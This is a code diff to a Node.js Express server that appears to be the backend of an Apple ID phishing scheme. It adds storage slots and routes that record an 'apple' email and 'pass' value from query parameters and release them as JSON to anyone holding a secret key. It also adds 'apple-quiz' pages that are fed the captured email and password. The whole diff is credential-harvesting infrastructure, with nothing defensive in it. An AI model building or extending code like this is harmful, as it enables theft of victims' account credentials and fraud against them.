@@ -19,6 +19,12 @@ var pwd2 = {"apple":"",
 var pwd3 = {"apple":"",
            "pass":""}
 
+var pwd4 = {"apple":"",
+           "pass":""}
+
+var pwd5 = {"apple":"",
+           "pass":""}
+
 process.on('uncaughtException', function (err) {
   console.error(err);
   console.log("Node NOT Exiting...");
@@ -175,6 +181,32 @@ if (req.query.s == process.env.s) {
 }
 });
 
+app.get("/pwd4", function(req,res) {
+  if (req.query.ne) {
+    pwd4["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd4["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd4)
+} else {
+  res.render("404.ejs")
+}
+});
+
+app.get("/pwd5", function(req,res) {
+  if (req.query.ne) {
+    pwd5["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd5["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd5)
+} else {
+  res.render("404.ejs")
+}
+});
+
 app.get("/A2/:rnd", function(req,res) {
   res.redirect("https://discord.gg/k3NRzYtmsj")
 })
@@ -191,6 +223,10 @@ app.get("/quize/apple-quizez", function(req,res) {
   res.render("apple-quizez",{email:pwd3["apple"],pass:pwd3["pass"]})
 })
 
+app.get("/quize/apple-quizeg", function(req,res) {
+  res.render("apple-quizeg",{email:pwd["apple"],pass:pwd["pass"]})
+})
+
 app.get("/quize/1apple-quize", function(req,res) {
   res.render("1apple-quize")
 })
@@ -201,6 +237,10 @@ app.get("/quize/1apple-quizes", function(req,res) {
 
 app.get("/quize/1apple-quizez", function(req,res) {
   res.render("1apple-quizez")
+})
+
+app.get("/quize/1apple-quizeg", function(req,res) {
+  res.render("1apple-quizeg")
 })
 
 app.get("/redirection", function(req, res) {
